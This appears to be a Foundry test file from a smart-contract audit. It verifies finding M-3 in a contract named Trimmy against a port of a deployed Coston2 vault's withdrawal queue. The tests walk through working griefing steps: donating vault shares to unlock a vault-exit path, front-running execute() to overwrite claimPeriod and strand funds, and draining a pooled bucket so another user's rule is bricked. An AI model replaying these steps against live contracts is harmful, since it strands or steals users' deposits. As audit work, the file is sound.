// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {SafeERC20} from "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";

import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {Trimmy} from "../../src/Trimmy.sol";
import {MockERC20, MockFtsoV2, MockRegistry, MockSwapRouter} from "../mocks/Mocks.sol";

/// @notice A FAITHFUL port of the queue logic of the deployed vault
///         `TESTearnXRP 0x9E63a5D282F2fBb7DcE822B98e363b2719D28319` (`MyERC4626`), taken from the
///         verified source fetched from the Coston2 explorer. The repo's own MockQueuedVault is
///         *lenient* in one load-bearing way: `claimWithdraw` on an already-drained bucket returns
///         0 instead of reverting. The real vault reverts `NoPendingWithdrawAssets()`
///         (_completeWithdraw) and `InvalidReceiver()` (_deleteReceiver).
contract FaithfulVault is ERC20 {
    using SafeERC20 for IERC20;

    IERC20 public immutable assetToken;
    uint256 public constant PERIOD_DURATION = 1 days;
    uint256 public lagDuration = 300;

    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawAssets;
    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawShares;
    mapping(uint256 => address[]) private uniqueReceivers;
    mapping(address => mapping(uint256 => uint256)) private receiverIndex;

    error InvalidPeriod();
    error NoPendingWithdrawAssets();
    error InvalidReceiver(address receiverAddr, uint256 period);

    constructor(IERC20 asset_) ERC20("Faithful Vault", "fVLT") {
        assetToken = asset_;
    }

    function decimals() public view override returns (uint8) {
        return MockERC20(address(assetToken)).decimals();
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        assetToken.safeTransferFrom(msg.sender, address(this), assets);
        shares = assets; // 1:1 share price keeps the arithmetic in the test obvious
        _mint(receiver, shares);
    }

    function maxDeposit(address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function previewDeposit(uint256 assets) external pure returns (uint256) {
        return assets;
    }

    /// @dev Mirrors MyERC4626._withdraw: burn, then ACCUMULATE into the (receiver, period) bucket.
    ///      Note `+=` — a second request in a *different* period does not revert, it simply opens a
    ///      second bucket. That is the precondition M-3 depends on.
    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        if (owner != msg.sender) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assets = shares;

        uint256 period = (block.timestamp + lagDuration) / PERIOD_DURATION;
        if (pendingWithdrawAssets[receiver][period] == 0) {
            uniqueReceivers[period].push(receiver);
            receiverIndex[receiver][period] = uniqueReceivers[period].length;
        }
        pendingWithdrawAssets[receiver][period] += assets;
        pendingWithdrawShares[receiver][period] += shares;
    }

    /// @dev Mirrors MyERC4626.claimWithdraw + _completeWithdraw + _deleteReceiver.
    function claimWithdraw(uint256 period) external returns (uint256 assets) {
        if (period >= block.timestamp / PERIOD_DURATION) revert InvalidPeriod();
        assets = pendingWithdrawAssets[msg.sender][period];
        if (assets == 0) revert NoPendingWithdrawAssets();
        delete pendingWithdrawAssets[msg.sender][period];
        delete pendingWithdrawShares[msg.sender][period];
        uint256 index = receiverIndex[msg.sender][period];
        if (index == 0) revert InvalidReceiver(msg.sender, period);
        delete receiverIndex[msg.sender][period];
        uniqueReceivers[period].pop();
        assetToken.safeTransfer(msg.sender, assets);
    }
}

/// Adversarial verification of M-3 (claimPeriod overwrite strands the earlier bucket).
/// Two questions the claim did not settle:
///   (1) Is EXIT_VAULT reachable at all on the LIVE allowlist (FXRP + WC2FLR, no share token)?
///   (2) With a faithful vault, is the strand actually permanent, or does the mock overstate it?
contract AdversarialM3Test is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;
    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));
    bytes21 internal constant FEED_FLR =
        bytes21(uint168(0x01464c522f55534400000000000000000000000000));

    MockERC20 internal fxrp;
    MockERC20 internal wflr;
    MockFtsoV2 internal ftso;
    MockSwapRouter internal router;
    FaithfulVault internal vault;

    address internal victim = makeAddr("victim");
    address internal keeper = makeAddr("keeper");
    address internal griefer = makeAddr("griefer");
    address internal feeSink = makeAddr("feeSink");

    function setUp() public {
        // Start mid-day so the first part cannot accidentally straddle a period boundary.
        vm.warp(10 days + 12 hours);
        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        wflr = new MockERC20("WC2FLR", "WC2FLR", 18);
        ftso = new MockFtsoV2();
        MockRegistry reg = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(reg).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));
        router = new MockSwapRouter();
        vault = new FaithfulVault(IERC20(address(fxrp)));
        _feeds();
    }

    function _feeds() internal {
        ftso.setFeed(FEED_XRP, 3_000_000, 6, uint64(vm.getBlockTimestamp()));
        ftso.setFeed(FEED_FLR, 20_000, 6, uint64(vm.getBlockTimestamp()));
    }

    /// The EXACT live allowlist: token0 FXRP, token1 WC2FLR, venue0 router, venue1 vault.
    /// The vault SHARE token is deliberately absent, as on chain.
    function _deployLive() internal returns (Trimmy) {
        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(fxrp), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(wflr), feedId: FEED_FLR, decimals: 18});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](2);
        venues[0] = Trimmy.VenueCfg({
            target: address(router), kind: Trimmy.VenueKind.SWAP_ROUTER_V3, feeTier: 3000
        });
        venues[1] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        return new Trimmy(tokens, venues, 120, feeSink, IConfidentialTrigger(address(0)));
    }

    /// A hypothetical deployment that DOES allowlist the share token as token index 0.
    function _deployWithShareToken() internal returns (Trimmy) {
        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](1);
        tokens[0] = Trimmy.TokenCfg({token: address(vault), feedId: FEED_XRP, decimals: 6});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](1);
        venues[0] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        return new Trimmy(tokens, venues, 120, feeSink, IConfidentialTrigger(address(0)));
    }

    function _armExit(
        Trimmy t,
        address who,
        uint8 sellTokenId,
        uint8 venueId,
        uint128 total,
        uint128 part
    ) internal returns (uint256) {
        Trimmy.RuleParams memory p = Trimmy.RuleParams({
            sellTokenId: sellTokenId,
            buyTokenId: sellTokenId,
            verb: Trimmy.Verb.EXIT_VAULT,
            venueId: venueId,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: total,
            partSellAmount: part,
            minOutAbsolute: 0,
            triggerValue: 60,
            expiry: uint64(block.timestamp + 300 days),
            slippageBips: 0,
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
        vm.prank(who);
        return t.arm(p);
    }

    // ---------------------------------------------------------------------------------
    // (1) REACHABILITY ON THE LIVE ALLOWLIST
    // ---------------------------------------------------------------------------------

    /// On the deployed allowlist the only sellable tokens are FXRP and WC2FLR. `_validate` does not
    /// require the EXIT_VAULT sell token to be the venue's share token, so the rule ARMS — but the
    /// execution burns shares Trimmy does not hold, so `_doQueueRedeem` is unreachable. M-3 cannot
    /// fire on the live instance in its current state.
    function test_liveAllowlist_exitVaultArmsButCannotExecute() public {
        Trimmy t = _deployLive();
        fxrp.mint(victim, 1000e6);
        vm.prank(victim);
        fxrp.approve(address(t), type(uint256).max);

        uint256 id = _armExit(t, victim, 0, 1, 100e6, 50e6); // sell FXRP into the vault venue
        assertEq(uint8(t.ruleAt(id).verb), uint8(Trimmy.Verb.EXIT_VAULT), "arm() accepted it");

        assertEq(vault.balanceOf(address(t)), 0, "Trimmy holds no vault shares");
        vm.prank(keeper);
        vm.expectRevert(); // ERC20InsufficientBalance on _burn(Trimmy, shares)
        t.execute(id);
    }

    /// ...but the gate is only Trimmy's share BALANCE, and the share token is a freely transferable
    /// ERC20. Anybody can donate shares to Trimmy, after which the same live-configuration rule
    /// executes and M-3 is live on the deployed contract. (Note the collateral damage: the victim's
    /// FXRP is pulled in and never leaves — a second defect, out of scope here.)
    function test_liveAllowlist_donationMakesExitVaultReachable() public {
        Trimmy t = _deployLive();
        fxrp.mint(victim, 1000e6);
        vm.prank(victim);
        fxrp.approve(address(t), type(uint256).max);

        // Anyone can do this; it needs no permission from Trimmy.
        fxrp.mint(griefer, 1000e6);
        vm.startPrank(griefer);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(200e6, griefer);
        vault.transfer(address(t), 200e6);
        vm.stopPrank();

        uint256 id = _armExit(t, victim, 0, 1, 100e6, 50e6);
        vm.prank(keeper);
        t.execute(id); // now succeeds: _doQueueRedeem runs
        assertGt(t.ruleAt(id).pendingShares, 0, "redemption queued on the LIVE allowlist");
    }

    // ---------------------------------------------------------------------------------
    // (2) IS THE STRAND REAL AND PERMANENT AGAINST THE REAL VAULT'S SEMANTICS?
    // ---------------------------------------------------------------------------------

    /// Same-day parts are FINE: both file under the same period, pendingShares accumulates and one
    /// claim pays both. This is the control that shows the bug is the period CROSSING, not the
    /// second queue per se.
    function test_control_samePeriodPartsAccumulateAndAreFullyPaid() public {
        Trimmy t = _deployWithShareToken();
        fxrp.mint(victim, 1000e6);
        vm.startPrank(victim);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(1000e6, victim);
        vault.approve(address(t), type(uint256).max);
        vm.stopPrank();

        uint256 id = _armExit(t, victim, 0, 0, 100e6, 50e6);
        vm.prank(keeper);
        t.execute(id);
        uint64 P = t.ruleAt(id).claimPeriod;
        vm.warp(vm.getBlockTimestamp() + 120);
        _feeds();
        vm.prank(keeper);
        t.execute(id);
        assertEq(t.ruleAt(id).claimPeriod, P, "both parts landed in the same bucket");

        vm.warp(uint256(P + 1) * 1 days + 1);
        _feeds();
        uint256 before = fxrp.balanceOf(victim);
        vm.prank(keeper);
        t.claim(id);
        assertEq(fxrp.balanceOf(victim) - before, 100e6, "no loss when the period does not change");
    }

    /// THE FINDING. Part one files under P. Before it is claimed, a part filed under P+1 overwrites
    /// `claimPeriod`. `claim()` pays only P+1 and zeroes `pendingShares` wholesale. Against the REAL
    /// vault's semantics the bucket P is then unreachable forever: no Trimmy function takes a period
    /// argument, and a second `claim()` reverts `NothingPending`.
    function test_M3_overwriteStrandsBucketPermanently() public {
        Trimmy t = _deployWithShareToken();
        fxrp.mint(victim, 1000e6);
        vm.startPrank(victim);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(1000e6, victim);
        vault.approve(address(t), type(uint256).max);
        vm.stopPrank();

        uint256 id = _armExit(t, victim, 0, 0, 100e6, 50e6);

        vm.prank(keeper);
        t.execute(id); // part 1 -> bucket P
        uint64 P = t.ruleAt(id).claimPeriod;
        assertEq(vault.pendingWithdrawAssets(address(t), P), 50e6, "bucket P holds part one");

        // Roll past claimableAt. The honest keeper would claim here; `execute` is permissionless,
        // so a griefer front-runs the claim with the next part. No special timing window needed.
        vm.warp(uint256(t.ruleAt(id).claimableAt) + 1);
        _feeds();
        vm.prank(griefer);
        t.execute(id); // part 2 -> bucket P+1, OVERWRITES the pointer to P
        assertEq(uint256(t.ruleAt(id).claimPeriod), uint256(P) + 1, "pointer moved off bucket P");

        vm.warp(uint256(t.ruleAt(id).claimableAt) + 1);
        _feeds();
        uint256 before = fxrp.balanceOf(victim);
        vm.prank(keeper);
        t.claim(id);
        uint256 paid = fxrp.balanceOf(victim) - before;

        // Both parts' shares were burned; only one part was paid.
        assertEq(t.ruleAt(id).pendingShares, 0, "pendingShares zeroed wholesale");
        assertEq(
            vault.pendingWithdrawAssets(address(t), P), 50e6, "bucket P still funded, orphaned"
        );

        // Permanence: no second claim, and nothing else in Trimmy calls claimWithdraw.
        vm.prank(keeper);
        vm.expectRevert(Trimmy.NothingPending.selector);
        t.claim(id);

        emit log_named_uint("shares burned", 100e6);
        emit log_named_uint("assets paid to victim", paid);
        assertEq(paid, 100e6, "victim burned 100e6 of shares and must receive 100e6 of assets");
    }

    /// Aggravation, verified against the REAL vault's `NoPendingWithdrawAssets` revert: the queue is
    /// keyed by (receiver = Trimmy, period), so it is POOLED across rules and users. Rule B claiming
    /// period P drains rule A's assets too, and rule A's own claim then reverts forever, so its
    /// `pendingShares` can never be cleared.
    function test_M3_pooledBucket_firstClaimerTakesAll_andSecondBricksForever() public {
        Trimmy t = _deployWithShareToken();
        address other = makeAddr("other");
        for (uint256 i = 0; i < 2; i++) {
            address who = i == 0 ? victim : other;
            fxrp.mint(who, 1000e6);
            vm.startPrank(who);
            fxrp.approve(address(vault), type(uint256).max);
            vault.deposit(1000e6, who);
            vault.approve(address(t), type(uint256).max);
            vm.stopPrank();
        }

        uint256 idA = _armExit(t, victim, 0, 0, 50e6, 50e6);
        uint256 idB = _armExit(t, other, 0, 0, 50e6, 50e6);

        vm.startPrank(keeper);
        t.execute(idA);
        t.execute(idB);
        vm.stopPrank();
        uint64 P = t.ruleAt(idA).claimPeriod;
        assertEq(t.ruleAt(idB).claimPeriod, P, "one shared bucket");
        assertEq(vault.pendingWithdrawAssets(address(t), P), 100e6, "pooled");

        vm.warp(uint256(P + 1) * 1 days + 1);
        _feeds();
        uint256 beforeB = fxrp.balanceOf(other);
        vm.prank(keeper);
        t.claim(idB);
        uint256 paidB = fxrp.balanceOf(other) - beforeB;
        emit log_named_uint("rule B redeemed 50e6 of shares and was paid", paidB);

        // Rule A's claim now reverts against the real vault's semantics, forever: `pendingShares`
        // can never be cleared and the rule is permanently bricked.
        vm.prank(keeper);
        vm.expectRevert(abi.encodeWithSelector(FaithfulVault.NoPendingWithdrawAssets.selector));
        t.claim(idA);
        assertGt(t.ruleAt(idA).pendingShares, 0, "rule A stuck with unclaimable pendingShares");

        assertEq(paidB, 50e6, "rule B must be paid only its own 50e6, not the pooled 100e6");
    }
}
